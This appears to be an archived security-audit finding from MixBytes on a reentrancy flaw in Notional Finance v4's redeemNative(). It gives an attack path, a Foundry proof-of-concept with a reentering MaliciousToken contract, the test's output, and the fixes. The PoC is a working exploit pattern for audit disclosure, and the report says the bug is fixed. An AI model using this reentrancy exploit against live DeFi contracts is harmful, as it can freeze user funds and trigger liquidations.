---
tags:
  - lang/solidity
  - lang/vyper
  - sector/dex
  - sector/governance
  - sector/lending
  - sector/oracle
  - sector/staking
  - sector/token
  - platform/mixbytes
  - has/github
  - has/poc
  - severity/high
  - vuln/reentrancy/single-function
  - fix/use-reentrancy-guard
  - novelty/known-pattern
  - misassumption/external-call-is-safe
  - trigger/reentrancy-callback
protocol: "[[Notional Finance]]"
auditors:
  - "[[MixBytes]]"
report: "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#1-redeemnative-reentrancy-enables-permanent-fund-freeze-systemic-misaccounting-and-liquidation-cascades"
genome:
  - "[[single-function]]"
  - "[[use-reentrancy-guard]]"
  - "[[known-pattern]]"
  - "[[locked-funds]]"
  - "[[fot-slippage]]"
  - "[[liquidation-underwater]]"
  - "[[reentrancy-guard]]"
  - "[[timestamp-dependence]]"
  - "[[vote-delegation-loop]]"
---
# `redeemNative()` Reentrancy Enables Permanent Fund Freeze, Systemic Misaccounting, and Liquidation Cascades

- id: 63524
- impact: HIGH
- protocol: [[Notional Finance]]
- reporter: MixBytes
- source: https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#1-redeemnative-reentrancy-enables-permanent-fund-freeze-systemic-misaccounting-and-liquidation-cascades

## Summary


The report describes a bug in the redemption process of the AbstractYieldStrategy contract. This bug allows a malicious actor to exploit the system and freeze a portion of the vault's yield tokens, corrupting internal accounting and potentially causing liquidations. The vulnerability is caused by a reentrancy issue in the redeemNative() function, which calls other functions that are not protected against reentrancy. This allows the attacker to reenter and call functions that can manipulate the system during the redemption process. To fix this, the report recommends adding a nonReentrant guard to all external entry points and validating the exchangeData for Uniswap V2 trades to prevent insertion of malicious tokens. The severity of this bug is classified as critical, and the client has already implemented the recommended changes to fix it.

## Details

##### Description
The redemption flow in `AbstractYieldStrategy.redeemNative()` is vulnerable to reentrancy that corrupts internal accounting and can permanently freeze a portion of the vault's yield tokens. The `redeemNative()` function calls `AbstractStakingStrategy._redeemShares()`, which for instant redemption delegates to `AbstractYieldStrategy._executeTrade()` and performs an external call during redemption. Not all vault and router entry points are protected against reentrancy, which allows control to reenter from the lending router while `_burnShares()` is still executing. A malicious token placed on the swap path can exploit this by reentering and invoking `ILendingRouter.initiateWithdraw()` during the redemption.

When reentrancy occurs, the request manager transfers an amount N of yield tokens from the vault. This decreases the vault's true yield token balance along with `s_yieldTokenBalance` while `_burnShares()` continues to run based on a pre‑reentrancy snapshot. After control returns, `_burnShares()` computes `yieldTokensRedeemed = yieldTokensBefore - yieldTokensAfter` and then subtracts this value from `s_yieldTokenBalance`. Since `yieldTokensBefore` was taken before the reentrancy and the request manager already moved N tokens, `s_yieldTokenBalance` is effectively reduced twice for N. The resulting difference causes yield tokens to become unaccounted by internal state and remain frozen in the vault. This also distorts share pricing and may reduce health factors enough to trigger liquidations, enabling repeated exploitation, potentially leading to full vault fund freezing.

It is also possible to trigger a similar reentrancy through `AbstractYieldStrategy.collectFees()`, since it reduces the vault's yield token balance and `s_yieldTokenBalance`. The impact is smaller because fee collection typically moves a limited amount of tokens, but the accounting discrepancy mechanism is analogous.

**Attack Path:**

1. The attacker deploys a malicious ERC20 token and creates Uniswap V2 pools to form a swap path `yieldToken -> maliciousToken -> asset`.
2. The attacker enters a position via the lending router and gives approval to the malicious token to perform `initiateWithdraw` later on it.
3. The attacker ensures they hold native shares without an open position by liquidating another account first, following the protocol’s constraints.
4. The attacker calls `redeemNative` using the instant redemption path and sets `exchangeData` to the Uniswap V2 path that includes the malicious token.
5. During the Uniswap V2 swap, the malicious token’s `transfer()` reenters and calls `ILendingRouter.initiateWithdraw(attacker, vault, ...)` while `_burnShares()` is still running.
6. The Withdraw Request Manager transfers N yield tokens from the vault during reentrancy, decreasing the vault’s true yield token balance with `s_yieldTokenBalance` aswell.
7. Control returns to `_burnShares()`, which computes `yieldTokensRedeemed` using the pre‑reentrancy snapshot and subtracts it from `s_yieldTokenBalance`. The result is an effective subtraction of M + 2N, leaving N yield tokens unaccounted by internal state and thus frozen.
8. The mismatch between `ERC20(yieldToken).balanceOf(address(y))` and `s_yieldTokenBalance` becomes observable. Health factors can drop, triggering liquidations and enabling repeated exploitation.

Here is the proof of concept that shows the attack:

Firstly, put these lines into `MockStakingStrategy` contract:

```solidity
// Expose internal state for testing
function _s_yieldTokenBalance() external view returns (uint256) {
    return s_yieldTokenBalance;
}
```

Then, put this file into `tests` folder and run it with `forge test --match-test test_reentrancy_redeemNative_initiateWithdraw_instant -vvv`:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.29;

import "forge-std/src/Test.sol";

import "./TestMorphoYieldStrategy.sol";
import "./TestWithdrawRequestImpl.sol";
import "../src/staking/AbstractStakingStrategy.sol";
import "../src/staking/StakingStrategy.sol";
import "../src/withdraws/EtherFi.sol";
import "../src/interfaces/ITradingModule.sol";
import "./TestStakingStrategy.sol";
import "./Mocks.sol";

contract TestBug2Instant is TestMorphoYieldStrategy {
    struct UniV2Data { address[] path; }
    address attacker;
    address maliciousToken;

    address[] routeRedeem;

    function deployYieldStrategy() internal override {
        setupWithdrawRequestManager(address(
            new EtherFiWithdrawRequestManager()
        ));
        y = new MockStakingStrategy(address(WETH), address(weETH), 0.0010e18);

        w = ERC20(y.yieldToken());
        (AggregatorV2V3Interface oracle, ) = TRADING_MODULE.priceOracles(
            address(w)
        );
        
        o = new MockOracle(oracle.latestAnswer());

        defaultDeposit = 10e18;
        defaultBorrow = 90e18;
        maxEntryValuationSlippage = 0.0050e18;
        maxExitValuationSlippage = 0.0050e18;

        withdrawRequest = new TestEtherFiWithdrawRequest();
        canInspectTransientVariables = true;
    }

    function postDeploySetup() internal override {
        // Set permissions to trade
        vm.startPrank(owner);
        TRADING_MODULE.setTokenPermissions(
            address(y),
            address(weETH),
            ITradingModule.TokenPermissions(
            { allowSell: true, dexFlags: uint32(1 << uint8(DexId.UNISWAP_V2)),
             tradeTypeFlags: 5 }
        ));
        vm.stopPrank();

        attacker = _createUser("attacker");
        
        // weETH whale
        vm.startPrank(0xBdfa7b7893081B35Fb54027489e2Bc7A38275129); 
        weETH.transfer(attacker, 10_000e18);
        vm.stopPrank();

        // Create UniswapV2 route with malicious token
        vm.startPrank(attacker);
        maliciousToken = address(new MaliciousToken(
            address(lendingRouter),
            attacker,
            address(y)
        ));
        routeRedeem.push(address(weETH));
        routeRedeem.push(maliciousToken);
        routeRedeem.push(address(WETH));

        address uniRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        WETH.deposit{value: 100e18}();
        WETH.approve(uniRouter, type(uint256).max);
        weETH.approve(uniRouter, type(uint256).max);
        IERC20(maliciousToken).approve(uniRouter, type(uint256).max);

        IUniswapV2Router01(uniRouter).addLiquidity(
            routeRedeem[0],
            routeRedeem[1],
            100e18,
            110e18,
            0,
            0,
            attacker,
            block.timestamp
        );

        IUniswapV2Router01(uniRouter).addLiquidity(
            routeRedeem[1],
            routeRedeem[2],
            100e18,
            100e18,
            0,
            0,
            attacker,
            block.timestamp
        );

        // Allow token to initiate withdraw on behalf of attacker
        lendingRouter.setApproval(maliciousToken, true);

        vm.stopPrank();
    }

    function getRedeemData(
        address /* user */,
        uint256 /* shares */
    ) internal view override returns (bytes memory redeemData) {
        // Calldata for instant redemption
        return abi.encode(RedeemParams({
            minPurchaseAmount: 0,
            dexId: uint8(DexId.UNISWAP_V2),
            exchangeData: abi.encode(
                UniV2Data({
                path: routeRedeem
                })
            )
        }));
    }

    function _createUser(string memory name) internal returns (address user) {
        user = makeAddr(name);
        vm.label(user, name);

        // Give initial funds to user
        vm.deal(user, 1000e18);

        vm.startPrank(owner);
        asset.transfer(user, 10_000e18);
        vm.stopPrank();
    }

    function test_reentrancy_redeemNative_initiateWithdraw_instant() 
        external
        onlyIfWithdrawRequestManager 
    {
        address user = _createUser("user");
        address user2 = _createUser("user2");
        address liquidator = _createUser("liquidator");

        // Initial state of the vault with having some yield tokens
        _enterPosition(user2, defaultDeposit, 0);

        // Attacker enters position before liquidation
        _enterPosition(attacker, defaultDeposit / 10, defaultBorrow / 20);

        console.log("Before liquidation - s_yieldTokenBalance:",
                    MockStakingStrategy(address(y))._s_yieldTokenBalance());
        console.log("Before liquidation - yield token balance:",
                    ERC20(y.yieldToken()).balanceOf(address(y)));
        console.log("Before liquidation - share total supply:",
                    y.totalSupply());
        console.log("Before liquidation - share price attacker:",
                    y.price(attacker));
        console.log("Before liquidation - share price user2:",
                    y.price(user2));
        (uint256 borrowed, uint256 collateralValue, uint256 maxBorrow) =
            lendingRouter.healthFactor(user2, address(y));
        console.log("Before liquidation - collateralValue:", collateralValue);
        console.log("Before liquidation - maxBorrow:", maxBorrow);

        int256 initialPrice = o.latestAnswer();

        // Perform liquidation (liquidator is different account of attacker)
        uint256 sharesToLiquidator = _liquidate(user, liquidator);

        // Return initial price of collateral (just for clarity)
        o.setPrice(initialPrice);

        console.log("After liquidation - s_yieldTokenBalance:",
                    MockStakingStrategy(address(y))._s_yieldTokenBalance());
        console.log("After liquidation - yield token balance:",
                    ERC20(y.yieldToken()).balanceOf(address(y)));
        console.log("After liquidation - share total supply:",
                    y.totalSupply());
        console.log("After liquidation - share price attacker:",
                    y.price(attacker));
        console.log("After liquidation - share price user2:",
                    y.price(user2));
        (borrowed, collateralValue, maxBorrow) = lendingRouter.healthFactor(
            user2, 
            address(y)
        );
        console.log("After liquidation - collateralValue:", collateralValue);
        console.log("After liquidation - maxBorrow:", maxBorrow);

        console.log("Shares balance of attacker",
                    lendingRouter.balanceOfCollateral(attacker, address(y)));
        console.log("Shares balance of liquidator",
                    y.balanceOf(liquidator));

        // Perform reentrancy
        vm.startPrank(liquidator);
        y.redeemNative(sharesToLiquidator, getRedeemData(
            liquidator, 
            sharesToLiquidator)
        );
        checkTransientsCleared();
        vm.stopPrank();

        console.log("After attack - s_yieldTokenBalance:",
                    MockStakingStrategy(address(y))._s_yieldTokenBalance());
        console.log("After attack - yield token balance:",
                    ERC20(y.yieldToken()).balanceOf(address(y)));
        console.log("After attack - share total supply:",
                    y.totalSupply());
        console.log("After attack - share price attacker:",
                    y.price(attacker));
        console.log("After attack - share price user2:",
                    y.price(user2));
        (borrowed, collateralValue, maxBorrow) = lendingRouter.healthFactor(
            user2, 
            address(y)
        );
        console.log("After attack - collateralValue:", collateralValue);
        console.log("After attack - maxBorrow:", maxBorrow);
    }

    function _liquidate(address user, address liquidator) 
        internal returns (uint256 sharesToLiquidator) 
    {
        _enterPosition(user, defaultDeposit, defaultBorrow);
        uint256 balanceBefore = lendingRouter.balanceOfCollateral(
            user,
            address(y)
        );

        // Drop the collateral price to make position unhealthy
        o.setPrice(o.latestAnswer() * 0.85e18 / 1e18);

        // Liquidate the position
        vm.warp(block.timestamp + 6 minutes);

        vm.startPrank(liquidator);
        asset.approve(address(lendingRouter), type(uint256).max);
        uint256 assetBefore = asset.balanceOf(liquidator);
        sharesToLiquidator = lendingRouter.liquidate(
            user, 
            address(y), 
            balanceBefore, 
            0
        );
        uint256 assetAfter = asset.balanceOf(liquidator);
        uint256 netAsset = assetBefore - assetAfter;

        uint256 balanceAfter = lendingRouter.balanceOfCollateral(
            user, 
            address(y)
        );
        assertEq(balanceAfter, balanceBefore - sharesToLiquidator);
        assertEq(y.balanceOf(liquidator), sharesToLiquidator);
        vm.stopPrank();
    }
}

contract MaliciousToken is ERC20("Malicious", "TKN") {

    uint count;
    address onBehalf;
    address vault;
    address lr;

    constructor(address lr_, address onBehalf_, address vault_) {
        _mint(msg.sender, 100000e18);

        lr = lr_;
        onBehalf = onBehalf_;
        vault = vault_;
    }

    function transfer(address to, uint256 value) {
        public
        override
        returns (bool)
    {
        // Reenter only once
        if (count == 0) {
            ILendingRouter(lr).initiateWithdraw(onBehalf, vault, "");
        }
        address owner = _msgSender();
        _transfer(owner, to, value);
        count = count + 1;
        return true;
    }
}

interface IUniswapV2Router01 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}
```

The results of the test are as follows:

```
Before liquidation - s_yieldTokenBalance: 14414159849677474491
Before liquidation - yield token balance: 14414159849677474491
Before liquidation - share total supply: 14414159849677474491000000
Before liquidation - share price attacker: 1071991787524217088000000000000
Before liquidation - share price user2: 1071991787524217088000000000000
Before liquidation - collateralValue: 9968942569622939455
Before liquidation - maxBorrow: 9121582451204989601
After liquidation - s_yieldTokenBalance: 107408739525016019612
After liquidation - yield token balance: 107408739525016019612
After liquidation - share total supply: 107408739525016019612000000
After liquidation - share price attacker: 1071991775286867985000000000000
After liquidation - share price user2: 1071991775286867985000000000000
After liquidation - collateralValue: 9968942455822225838
After liquidation - maxBorrow: 9121582347077336641
Shares balance of attacker 5114701882143619980000000
Shares balance of liquidator 92994579675338545121000000
After attack - s_yieldTokenBalance: 4184757263746203114
After attack - yield token balance: 9299459087502815641
After attack - share total supply: 14414159849677474491000000
After attack - share price attacker: 1071991775286867985000000000000
After attack - share price user2: 482396298879090593000000000000
After attack - collateralValue: 4486024105120001625
After attack - maxBorrow: 4104712056184801486
```

We see that `s_yieldTokenBalance` is twice less than yield token balance after attack, and `collateralValue` and `maxBorrow` of attacked position holder is decreased more than 2 times, though they didn't change their position themselves.

This issue is classified as **Critical** severity because it allows a malicious actor to corrupt accounting, freeze user funds inside the vault, distort share pricing, and potentially cause cascading liquidations leading to systemic protocol failure.

##### Recommendation
We recommend making the following changes:
1. Add a `nonReentrant` guard to all external entry points that can be reached during redemption and accounting updates, including lending router functions, and functions in request manager such as `initiateWithdraw()` and `finalize()`. We would also suggest to add guard to as much external functions of the protocol as possible, to eliminate attack possibility totally.
2. Validate `exchangeData` for Uniswap V2 trades and enforce that the path contains exactly **two tokens** (single-hop swap) to prevent insertion of arbitrary intermediary tokens that can perform reentrancy during transfer.

> **Client's Commentary:** 
> Fixed here: https://github.com/notional-finance/notional-v4/pull/34/commits/abcd6bef62b2c53cc8f680b92c8554a1a0474c4e

---


## Artifacts

- Raw capture: /Users/user/Desktop/crawlee-run/pages_capture.har
- Pages snapshot: /Users/user/Desktop/crawlee-run/all_findings_full.json
